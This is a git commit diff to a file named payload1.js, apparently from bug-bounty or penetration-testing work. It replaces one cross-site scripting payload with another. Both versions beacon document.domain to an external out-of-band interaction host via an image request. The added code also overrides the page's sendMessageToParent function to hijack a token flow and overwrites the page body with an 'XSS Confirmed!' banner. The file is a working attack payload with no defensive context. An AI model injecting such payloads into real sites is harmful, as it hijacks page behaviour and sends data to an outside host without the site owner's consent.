ae1f9915e45d36898e55e2af00c76f2edeba54f2
siddhu-1005 <84862560+siddhu-1005@users.noreply.github.com>
2025-07-25 22:03:42 +0530

    payload2.js

--- payload1.js
+++ payload1.js
@@ -1,2 +1,8 @@
-new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/?domain=" + document.domain;
-alert("XSS on " + document.domain);
+// 🚨 Force override token flow and ping you
+window.sendMessageToParent = function() {
+  new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/?" + document.domain;
+  alert("✅ JS Executed on " + document.domain);
+};
+
+// Optional DOM overwrite to kill spinner
+document.body.innerHTML = "<h1 style='color:red'>XSS Confirmed!</h1>";
